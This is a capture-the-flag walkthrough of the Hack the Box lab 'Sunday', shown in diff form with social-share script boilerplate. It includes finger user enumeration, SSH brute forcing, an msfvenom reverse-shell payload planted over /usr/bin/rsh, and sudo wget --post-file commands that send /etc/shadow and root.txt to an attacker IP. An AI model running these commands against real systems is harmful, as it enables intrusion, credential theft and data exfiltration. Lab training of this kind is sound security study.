@@ -1,0 +1,515 @@
+
+								
+																		Hack the Box: Sunday Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on October 1, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends!! Today we are going to solve another CTF challenge “Sunday. Sunday is a retired vulnerable lab presented by Hack the Box for making online penetration practices according to your experience level; they have the collection of vulnerable labs as challenges, from beginners to Expert level.
+Level: Easy
+Task: find user.txt and root.txt file in the victim’s machine.
+Penetration Methodology 
+Scanning 
+
+Open ports and Running services (Nmap)
+
+Enumeration 
+
+Identify finger users (Metasploit)
+
+Exploit 
+
+SSH Brute force 
+Access shell using SSH
+
+Privilege Escalation
+
+Method 1
+Method 2
+Method 3
+Capture root.txt flag
+
+Walk-through
+Scanning 
+Since these labs are online available therefore they have static IP. The IP of Sunday is 10.10.10.76
+Let’s start off with scanning the network to find our target.
+
+		
+		
+			
+			
+			
+			
+nmap -p- -A 10.10.10.76 --open
+			
+				
+					
+				
+					1
+				
+						nmap -p- -A 10.10.10.76 --open
+					
+				
+			
+		
+
+
+Enumeration 
+So here, we notice very interesting result from nmap scan, here it shown port 79 is open for Sun Solaris fingered.  So I Googled for its exploit and found Metasploit exploit “Finger Service User Enumerator”.
+Then I load Metasploit framework for Identify valid users through the finger service using a variety of tricks and therefore, use the following module.
+
+		
+		
+			
+			
+			
+			
+use auxiliary/scanner/finger/finger_users
+msf auxiliary(scanner/finger/finger_users) &gt; set rhosts 10.10.10.76
+msf auxiliary(scanner/finger/finger_users) &gt; set users_file /root/pentest/SecLists/Usernames/Names/names.txt
+msf auxiliary(scanner/finger/finger_users) &gt; exploit
+			
+				
+					
+				
+					1234
+				
+						use auxiliary/scanner/finger/finger_usersmsf auxiliary(scanner/finger/finger_users) &gt; set rhosts 10.10.10.76msf auxiliary(scanner/finger/finger_users) &gt; set users_file /root/pentest/SecLists/Usernames/Names/names.txtmsf auxiliary(scanner/finger/finger_users) &gt; exploit
+					
+				
+			
+		
+
+
+Exploit
+So, basically it reviled so many usernames which it has found, now make a dictionary of the obtain username and password that will be helpful in SSH login brute force. 
+Here we have used “patator” for SSH login to launch brute force on port 22022 and execute the following command.
+
+		
+		
+			
+			
+			
+			
+patator ssh_login host=10.10.10.76 port=22022 user=sunny password=FILE0 0=probable-v2-top1575.txt persistent=0
+			
+				
+					
+				
+					1
+				
+						patator ssh_login host=10.10.10.76 port=22022 user=sunny password=FILE0 0=probable-v2-top1575.txt persistent=0
+					
+				
+			
+		
+
+Finally, we found the following the password of the user “sunny”.
+Password:  sunday
+
+But when we try to login into ssh by using above credential, it gave “no matching key exchange method found” error and also put some hint and drop the connection request.
+
+Then with little more research, I edit the following key to connect SSH and luckily obtain tty shell access.
+
+		
+		
+			
+			
+			
+			
+ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 sunny@10.10.10.76 -p22022
+sudo -l
+			
+				
+					
+				
+					12
+				
+						ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 sunny@10.10.10.76 -p22022sudo -l
+					
+				
+			
+		
+
+Then I check sudo right for user sunny and notice he can run /root/troll as root without a password.
+Lol!! Executing /root/troll was a troll. Further, I check the list for available list and directories, luckily I found shadow.backup inside the /backup directory.
+Inside shadow.backup, I found hashes for users Sammy and Sunny.
+
+So we try to crack these hashes by using john the ripper and fortunately obtained the password in plaintext format “cooldude!” of user sammy.
+
+Privilege Escalation Techniques 
+There are multiple ways to escalated root privilege in this lab, in this article, we have applied 4-ways to escalated root privilege to get the root.txt file.
+Now let’s switch from Sunny to Sammy and figure-out assigned sudo permission for him.
+
+		
+		
+			
+			
+			
+			
+sudo -l
+			
+				
+					
+				
+					1
+				
+						sudo -l
+					
+				
+			
+		
+
+Great!! We found that he has the right to download any file as root by using wget command. Now let’s also enumerate system binaries having enabled SUID bit.
+
+		
+		
+			
+			
+			
+			
+find / -perm -u=s -type f 2&gt;/dev/null
+			
+				
+					
+				
+					1
+				
+						find / -perm -u=s -type f 2&gt;/dev/null
+					
+				
+			
+		
+
+There so many binary files having SUID bit enabled, let’s exploit some of them to gain root privilege.
+
+Method 1
+Now let’s generate a payload using msfvenom, thus you can execute the following command and run php server to transfer this file.
+
+		
+		
+			
+			
+			
+			
+msfvenom -p solaris/x86/shell_reverse_tcp lhost=10.10.14.6 lport=5555 -f elf &gt; /root/Desktop/raj.elf
+php -S 0.0.0.0:80
+			
+				
+					
+				
+					12
+				
+						msfvenom -p solaris/x86/shell_reverse_tcp lhost=10.10.14.6 lport=5555 -f elf &gt; /root/Desktop/raj.elfphp -S 0.0.0.0:80
+					
+				
+			
+		
+
+
+Let’s download above raj.elf through wget inside /tmp directory and replace it from rsh binary.  Then start netcat listen in a new terminal to spawn tty shell of root privilege.
+
+		
+		
+			
+			
+			
+			
+cd /tmp
+sudo /usr/bin/wget 10.10.14.6/raj.elf -O /usr/bin/rsh
+/usr/bin/rsh
+			
+				
+					
+				
+					123
+				
+						cd /tmpsudo /usr/bin/wget 10.10.14.6/raj.elf -O /usr/bin/rsh/usr/bin/rsh
+					
+				
+			
+		
+
+
+Now when you will execute /usr/bin/rsh command, you get root privilege shell access as shown below in the image.
+
+		
+		
+			
+			
+			
+			
+id
+			
+				
+					
+				
+					1
+				
+						id
+					
+				
+			
+		
+
+And as you can observe the euid=0 for root, therefore, now let’s grab the root.txt file.
+
+		
+		
+			
+			
+			
+			
+cd /root
+ls
+cat root.txt
+			
+				
+					
+				
+					123
+				
+						cd /rootlscat root.txt
+					
+				
+			
+		
+
+ 
+Method 2
+The pfexec program is used to execute commands with the attributes specified by the user’s profiles in the exec_attr(4) database. It is invoked by the profile shells, pfsh, pfcsh, and pfksh which are linked to the Bourne shell, C shell, and Korn shell, respectively.
+From https://www.unix.com/man-page/all/1/pfexec/
+
+Now execute the following command to obtain root privilege shell.
+
+		
+		
+			
+			
+			
+			
+pfexec bash
+id
+cd /root
+ls
+cat root.txt
+			
+				
+					
+				
+					12345
+				
+						pfexec bashidcd /rootlscat root.txt
+					
+				
+			
+		
+
+So, in this lab challenge, we obtain root.txt file through four types of privilege escalation and there might be other ways also available to get the root.txt file. Try it yourself!!
+Happy Hacking 
+
+Method 3
+As we know that the sudo permission is available for the wget, thus we can use post-file option method to send the contents of any file for example /etc/password or /etc/shadow files.
+
+Therefore we execute the following command to post shadow file content on our local listening machine.
+
+		
+		
+			
+			
+			
+			
+sudo /usr/bin/wget --post-file=/etc/shadow 10.10.14.6
+			
+				
+					
+				
+					1
+				
+						sudo /usr/bin/wget --post-file=/etc/shadow 10.10.14.6
+					
+				
+			
+		
+
+
+And in the terminal where netcat listener is activated, you will get the content of shadow file.
+
+		
+		
+			
+			
+			
+			
+nc -lvp 80
+			
+				
+					
+				
+					1
+				
+						nc -lvp 80
+					
+				
+			
+		
+
+From the given image, you can observe that we have obtained the hash value of the root user. Either you can crack the hash value or can modify it.
+
+So we have copied the above content in a text file and so that we can replace the hash value of user: root from the hash value of user: sunny.
+
+In the given below image, you can observe that we have modified the root hash value by copying user sunny hashes, as we know that the password of sunny is “sunday”. Hence the new password for root will be sunday, now named the file as shadow and ready to transfer it.
+
+Now download the above-modified shadow file in its original path i.e. /etc/shadow, so that it will overwrite the original shadow file.
+
+		
+		
+			
+			
+			
+			
+sudo /usr/bin/wget 10.10.14.6/shadow -O /etc/shadow
+			
+				
+					
+				
+					1
+				
+						sudo /usr/bin/wget 10.10.14.6/shadow -O /etc/shadow
+					
+				
+			
+		
+
+
+Method 4
+Similarly, we can also post the content of the root.txt file directly to the listening machine.
+
+		
+		
+			
+			
+			
+			
+sudo /usr/bin/wget --post-file=/root/root.txt 10.10.14.6
+			
+				
+					
+				
+					1
+				
+						sudo /usr/bin/wget --post-file=/root/root.txt 10.10.14.6
+					
+				
+			
+		
+
+
+And in the terminal where netcat listener is activated, you will content of the root.txt file which is root flag.
+
+		
+		
+			
+			
+			
+			
+nc -lvp 80
+			
+				
+					
+				
+					1
+				
+						nc -lvp 80
+					
+				
+			
+		
+
+From the given image, you can observe that we have obtained the value of the root.txt.
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
